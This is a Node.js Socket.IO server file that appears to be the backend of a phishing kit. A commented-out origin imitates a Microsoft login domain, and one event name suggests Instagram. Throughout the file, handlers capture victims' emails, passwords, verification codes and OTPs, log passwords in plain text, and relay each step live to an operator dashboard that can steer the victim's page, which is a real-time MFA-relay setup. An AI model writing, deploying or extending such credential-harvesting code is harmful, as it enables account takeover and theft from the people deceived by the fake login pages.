const express = require("express");
const http = require("http");
const cors = require("cors");
const { Server } = require("socket.io");

const app = express();

app.use(
  cors({
    origin: "*", // Frontend domain
    methods: ["GET"], // Allowed HTTP methods
    credentials: true, // Allow cookies if needed
  })
);

app.get("/health", (req, res) => {
  res.status(200).json({ status: "healthy" });
});

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: [
      // "https://login-microsoftonlinecom-cd6683a6-git-69f45d.vercel.app",
      // "https://officeadmin-ochre.vercel.app",
      "http://localhost:5173",
      "http://localhost:5174",
    ],
    methods: ["GET", "POST"],
  },
});

let adminSockets = new Set();

const userSessions = new Map();

const sessions = new Map();

io.on("connection", (socket) => {
  console.log("New connection:", socket.id);

  // Relay events from login page to admin dashboard
  socket.on("new-login-attempt", (data) => {
    // Broadcast to all connected clients
    io.emit("new-login-attempt", data);
  });

  // Handle admin registration
  socket.on("register_admin", () => {
    adminSockets.add(socket);
    console.log("Admin registered:", socket.id);

    socket.on("disconnect", () => {
      adminSockets.delete(socket);
      console.log("Admin disconnected:", socket.id);
    });
  });

  // Handle email verification requests from users
  socket.on("verify_email", (data) => {
    // Store session data
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      events: [],
    };

    sessionData.events.push({
      type: "email-verification",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("new-login-attempt", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // socket.on("password-attempt", (data) => {
  //   console.log("Received password attempt:", {
  //     sessionId: data.sessionId,
  //     email: data.email,
  //     password: data.password,
  //   });

  //   const sessionData = sessions.get(data.sessionId);
  //   if (sessionData) {
  //     console.log("data dey");
  //     sessionData.events.push({
  //       type: "password-submission",
  //       timestamp: data.timestamp,
  //       data: data.password,
  //     });

  //     // Broadcast to admins
  //     adminSockets.forEach((adminSocket) => {
  //       adminSocket.emit("password-attempt", {
  //         ...data,
  //         sessionId: data.sessionId,
  //         timestamp: new Date().toISOString(),
  //       });
  //     });
  //   } else {
  //     console.error("No session found for sessionId:", data.sessionId);
  //   }
  // });

  socket.on("password-attempt", (data) => {
    console.log("Received password attempt:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Check if session data exists for the provided sessionId
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      // If no session exists, initialize a new session
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to the sessions map
    }

    // Add the password attempt as an event to the session
    sessionData.events.push({
      type: "password-submission",
      timestamp: data.timestamp || new Date().toISOString(), // Use provided timestamp or current time
      data: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("password-attempt", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // socket.on("authenticator-select", (data) => {
  //   console.log("Received authenticator-select:", {
  //     sessionId: data.sessionId,
  //     email: data.email,
  //     password: data.password,
  //   });

  //   const sessionData = sessions.get(data.sessionId);

  //   if (sessionData) {
  //     sessionData.events.push({
  //       type: "authenticator-select",
  //       timestamp: data.timestamp,
  //       email: data.email,
  //       password: data.password,
  //     });

  //     adminSockets.forEach((adminSocket) => {
  //       adminSocket.emit("authenticator-select", {
  //         ...data,
  //         sessionId: data.sessionId,
  //         timestamp: new Date().toISOString(),
  //       });
  //     });
  //   } else {
  //     console.error("No session found for sessionId:", data.sessionId);
  //   }
  // });

  socket.on("authenticator-select", (data) => {
    console.log("Received authenticator-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    let sessionData = sessions.get(data.sessionId);

    if (!sessionData) {
      // If no session exists, initialize it
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to sessions map
    }

    // Add the authenticator-select event to the session
    sessionData.events.push({
      type: "authenticator-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password, // Assuming 'data.password' is relevant here
    });

    // Broadcast to admin sockets
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("authenticator-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // socket.on("verifycode-select", (data) => {
  //   console.log("Received verifycode-select:", {
  //     sessionId: data.sessionId,
  //     email: data.email,
  //     password: data.password,
  //   });

  //   const sessionData = sessions.get(data.sessionId);

  //   if (sessionData) {
  //     sessionData.events.push({
  //       type: "verifycode-select",
  //       timestamp: data.timestamp,
  //       email: data.email,
  //       password: data.password,
  //     });

  //     adminSockets.forEach((adminSocket) => {
  //       adminSocket.emit("verifycode-select", {
  //         ...data,
  //         sessionId: data.sessionId,
  //         timestamp: new Date().toISOString(),
  //       });
  //     });
  //   } else {
  //     console.error("No session found for sessionId:", data.sessionId);
  //   }
  // });

  socket.on("verifycode-select", (data) => {
    console.log("Received verifycode-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Check if session data exists for the sessionId
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      // If no session exists, initialize a new one
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData);
    }

    // Add the verifycode-select event to the session
    sessionData.events.push({
      type: "verifycode-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("verifycode-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // socket.on("verify-click", (data) => {
  //   console.log("Received verify-click:", {
  //     sessionId: data.sessionId,
  //     email: data.email,
  //     password: data.password,
  //     verifyCode: data.verifyCode,
  //   });

  //   const sessionData = sessions.get(data.sessionId);

  //   if (sessionData) {
  //     sessionData.events.push({
  //       type: "verify-click",
  //       timestamp: data.timestamp,
  //       email: data.email,
  //       password: data.password,
  //       verifyCode: data.verifyCode,
  //     });

  //     adminSockets.forEach((adminSocket) => {
  //       adminSocket.emit("verify-click", {
  //         ...data,
  //         sessionId: data.sessionId,
  //         timestamp: new Date().toISOString(),
  //       });
  //     });
  //   } else {
  //     console.error("No session found for sessionId:", data.sessionId);
  //   }
  // });

  socket.on("verify-click", (data) => {
    console.log("Received verify-click:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    // Retrieve or initialize session data
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to sessions
    }

    // Add the verify-click event to the session
    sessionData.events.push({
      type: "verify-click",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("verify-click", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // socket.on("text-select", (data) => {
  //   console.log("Received text-select:", {
  //     sessionId: data.sessionId,
  //     email: data.email,
  //     password: data.password,
  //   });

  //   const sessionData = sessions.get(data.sessionId);

  //   if (sessionData) {
  //     sessionData.events.push({
  //       type: "text-select",
  //       timestamp: data.timestamp,
  //       email: data.email,
  //       password: data.password,
  //     });

  //     adminSockets.forEach((adminSocket) => {
  //       adminSocket.emit("text-select", {
  //         ...data,
  //         sessionId: data.sessionId,
  //         timestamp: new Date().toISOString(),
  //       });
  //     });
  //   } else {
  //     console.error("No session found for sessionId:", data.sessionId);
  //   }
  // });

  socket.on("text-select", (data) => {
    console.log("Received text-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Retrieve session data or initialize a new session if it doesn't exist
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email, // Store email in the session
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add to the sessions map
    }

    // Add the text-select event to the session
    sessionData.events.push({
      type: "text-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast the text-select event to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("text-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("text-click", (data) => {
    console.log("Received text-click:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
      verifyCode: data.verifyCode,
    });

    const sessionData = sessions.get(data.sessionId);

    if (sessionData) {
      sessionData.events.push({
        type: "text-click",
        timestamp: data.timestamp,
        email: data.email,
        password: data.password,
        verifyCode: data.verifyCode,
      });

      adminSockets.forEach((adminSocket) => {
        adminSocket.emit("text-click", {
          ...data,
          sessionId: data.sessionId,
          timestamp: new Date().toISOString(),
        });
      });
    } else {
      console.error("No session found for sessionId:", data.sessionId);
    }
  });

  // socket.on("call-select", (data) => {
  //   console.log("Received call-select:", {
  //     sessionId: data.sessionId,
  //     email: data.email,
  //     password: data.password,
  //   });

  //   const sessionData = sessions.get(data.sessionId);

  //   if (sessionData) {
  //     sessionData.events.push({
  //       type: "call-select",
  //       timestamp: data.timestamp,
  //       email: data.email,
  //       password: data.password,
  //     });

  //     adminSockets.forEach((adminSocket) => {
  //       adminSocket.emit("call-select", {
  //         ...data,
  //         sessionId: data.sessionId,
  //         timestamp: new Date().toISOString(),
  //       });
  //     });
  //   } else {
  //     console.error("No session found for sessionId:", data.sessionId);
  //   }
  // });

  socket.on("call-select", (data) => {
    console.log("Received call-select:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Check for existing session data
    let sessionData = sessions.get(data.sessionId);

    if (!sessionData) {
      // If no session exists, initialize a new one
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email, // Use email from data
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add new session to map
    }

    // Add call-select event to session data
    sessionData.events.push({
      type: "call-select",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("call-select", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // socket.on("call-authenticated", (data) => {
  //   console.log("Received call-authenticated:", {
  //     sessionId: data.sessionId,
  //     email: data.email,
  //     password: data.password,
  //   });

  //   const sessionData = sessions.get(data.sessionId);

  //   if (sessionData) {
  //     sessionData.events.push({
  //       type: "call-authenticated",
  //       timestamp: data.timestamp,
  //       email: data.email,
  //       password: data.password,
  //     });

  //     adminSockets.forEach((adminSocket) => {
  //       adminSocket.emit("call-authenticated", {
  //         ...data,
  //         sessionId: data.sessionId,
  //         timestamp: new Date().toISOString(),
  //       });
  //     });
  //   } else {
  //     console.error("No session found for sessionId:", data.sessionId);
  //   }
  // });

  socket.on("call-authenticated", (data) => {
    console.log("Received call-authenticated:", {
      sessionId: data.sessionId,
      email: data.email,
      password: data.password,
    });

    // Retrieve or create session dynamically
    let sessionData = sessions.get(data.sessionId);
    if (!sessionData) {
      console.log(
        "No session found. Initializing new session for sessionId:",
        data.sessionId
      );
      sessionData = {
        sessionId: data.sessionId,
        email: data.email,
        events: [],
      };
      sessions.set(data.sessionId, sessionData); // Add the new session
    }

    // Add the call-authenticated event to the session
    sessionData.events.push({
      type: "call-authenticated",
      timestamp: data.timestamp || new Date().toISOString(),
      email: data.email,
      password: data.password,
    });

    // Broadcast the event to all admin sockets
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("call-authenticated", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle full login attempts (with password)
  socket.on("login_attempt", (data) => {
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("login-attempt", {
        ...data,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("ig_attempt_init", (data) => {
    console.log(data);
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      events: [],
    };

    sessionData.events.push({
      type: "ig_attempt_init",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("ig_attempt_init", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("auth_value_submit", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      otp: data.otp,
      events: [],
    };

    sessionData.events.push({
      type: "auth_value_submit",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("auth_value_submit", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  socket.on("stay_signed_in", (data) => {
    const sessionData = sessions.get(data.sessionId) || {
      email: data.email,
      password: data.password,
      staySignedIn: data.staySignedIn,
      events: [],
    };

    sessionData.events.push({
      type: "stay_signed_in",
      timestamp: data.timestamp,
      data: data.email,
    });

    sessions.set(data.sessionId, sessionData);
    userSessions.set(data.sessionId, socket);

    // Broadcast to admins
    adminSockets.forEach((adminSocket) => {
      adminSocket.emit("stay_signed_in", {
        ...data,
        sessionId: data.sessionId,
        timestamp: new Date().toISOString(),
      });
    });
  });

  // Handle admin responses
  socket.on("admin_response", (data) => {
    // console.log(data);
    const { sessionId, eventIndex, response } = data;
    const userSocket = userSessions.get(sessionId);
    const sessionData = sessions.get(sessionId);

    if (userSocket && sessionData) {
      // Update session event status
      sessionData.events[eventIndex].status = response;

      // Send response to user
      userSocket.emit(
        "admin_response",
        //   {
        //   response,
        //   eventIndex,
        //   timestamp: new Date().toISOString(),
        // }
        data
      );

      // Broadcast update to all admins
      adminSockets.forEach((adminSocket) => {
        adminSocket.emit("status_update", {
          sessionId,
          eventIndex,
          status: response,
          timestamp: new Date().toISOString(),
        });
      });
    }
  });

  // Error handling
  socket.on("error", (error) => {
    console.error("Socket error:", error);
  });

  // socket.on("login-attempt", (data) => {
  //   // Broadcast to all connected clients
  //   io.emit("login-attempt", data);
  // });

  // socket.on("verify_email", (data) => {
  //   // Handle email verification
  //   io.emit("email_verification_result", data);
  //   // Emit 'email_verification_result' back to client
  // });

  socket.on("disconnect", () => {
    for (const [sessionId, sess] of userSessions.entries()) {
      if (sess === socket) {
        userSessions.delete(sessionId);
        sessions.delete(sessionId);
        break;
      }
    }
  });
});

app.get("/health", (req, res) => {
  res.status(200).json({ status: "healthy" });
});

const PORT = process.env.PORT || 8080;

server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
